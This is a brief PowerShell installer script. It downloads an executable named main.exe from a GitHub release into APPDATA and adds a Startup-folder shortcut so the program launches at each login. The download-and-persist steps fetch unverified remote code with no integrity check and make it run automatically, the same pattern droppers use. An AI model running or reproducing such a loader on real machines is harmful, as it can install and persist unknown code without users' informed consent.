# Settings
$appName = "main"
$exeUrl = "https://github.com/deany1014/final/releases/download/release/main.exe"
$installDir = "$env:APPDATA\$appName"
$exePath = "$installDir\$appName.exe"
$startupShortcut = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$appName.lnk"

# Create install directory
if (-not (Test-Path $installDir)) {
    New-Item -ItemType Directory -Path $installDir | Out-Null
}

# Download EXE
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing

# Create Startup Shortcut
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut($startupShortcut)
$shortcut.TargetPath = $exePath
$shortcut.WorkingDirectory = $installDir
$shortcut.Save()

Write-Host "`n✅ $appName installed and added to startup!" -ForegroundColor Green
